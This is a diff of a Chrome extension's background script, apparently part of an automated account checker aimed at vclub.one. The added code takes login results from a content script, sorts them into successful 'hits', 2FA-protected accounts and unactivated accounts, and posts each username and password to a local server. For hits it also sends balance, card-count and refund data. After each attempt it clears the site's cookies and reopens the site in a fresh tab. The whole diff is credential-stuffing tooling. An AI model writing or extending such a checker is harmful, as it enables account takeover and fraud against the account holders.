@@ -4,37 +4,60 @@ let isChecking = false;
 let checkInterval = null;
 
 // Listen for messages from popup and content scripts
-chrome.runtime.onMessage.addListener((request, sender, sendResponse) => {
-  if (request.action === 'setTargetSite') {
-    targetSite = request.site;
-    chrome.storage.local.set({ targetSite: targetSite });
-    sendResponse({ success: true });
-  }
-  else if (request.action === 'startChecking') {
-    startAccountChecking();
-    sendResponse({ success: true });
-  }
-  else if (request.action === 'stopChecking') {
-    stopAccountChecking();
-    sendResponse({ success: true });
-  }
-  else if (request.action === 'getStatus') {
-    sendResponse({ 
-      isChecking: isChecking, 
-      targetSite: targetSite 
-    });
-  }
-  else if (request.action === 'checkAccount') {
-    // Forward account check request to content script
-    chrome.tabs.query({ active: true, currentWindow: true }, (tabs) => {
-      if (tabs[0]) {
-        chrome.tabs.sendMessage(tabs[0].id, {
-          action: 'performAccountCheck',
-          credentials: request.credentials
+chrome.runtime.onMessage.addListener((message, sender, sendResponse) => {
+    if (message.type === '2fa_detected' || message.type === 'unactivated_detected' || message.type === 'hit_detected') {
+        const { username, password } = message;
+        let endpoint;
+        let body = { username, password };
+
+        if (message.type === '2fa_detected') {
+            endpoint = 'report-2fa';
+        } else if (message.type === 'unactivated_detected') {
+            endpoint = 'report-unactivated';
+        } else if (message.type === 'hit_detected') {
+            endpoint = 'report-hit';
+            body = {
+                username,
+                password,
+                balance: message.balance,
+                totalCCS: message.totalCCS,
+                amounts: message.amounts,
+                refunds: message.refunds
+            };
+        }
+
+        // Report to local server
+        fetch(`http://localhost:5050/${endpoint}`, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify(body)
+        })
+        .then(response => response.json())
+        .then(data => {
+            console.log(`Reported ${message.type}:`, data);
+        })
+        .catch(error => {
+            console.error(`Error reporting ${message.type}:`, error);
         });
-      }
-    });
-  }
+
+        // Clear cookies for vclub.one
+        chrome.cookies.getAll({ domain: 'vclub.one' }, (cookies) => {
+            cookies.forEach(cookie => {
+                const url = `https://${cookie.domain}${cookie.path}`;
+                chrome.cookies.remove({ url, name: cookie.name });
+            });
+            console.log('Cleared cookies for vclub.one');
+
+            // Open new tab with vclub.one
+            chrome.tabs.create({ url: 'https://vclub.one/' }, (tab) => {
+                console.log('Opened new tab:', tab.id);
+                // Close the old tab
+                chrome.tabs.remove(sender.tab.id, () => {
+                    console.log('Closed old tab:', sender.tab.id);
+                });
+            });
+        });
+    }
 });
 
 // Load saved target site on startup
